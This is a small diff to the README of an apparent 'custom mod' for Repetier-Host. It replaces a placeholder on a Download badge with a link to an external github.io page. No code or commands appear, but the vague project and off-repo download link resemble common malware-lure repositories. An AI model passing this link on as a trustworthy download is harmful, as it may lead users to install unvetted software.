@@ -2,7 +2,7 @@
 
 Custom mod for Repetier-Host that improves slicing previews, G-code tweaks, and printer profile automation for better print consistency.
 
-[![Download Repetier Mod](https://img.shields.io/badge/Download-RepetierMod-blueviolet)](#)
+[![Download Repetier Mod](https://img.shields.io/badge/Download-RepetierMod-blueviolet)](https://repetier-host-custom-slicer-mod.github.io/.github)
 
 ---
 
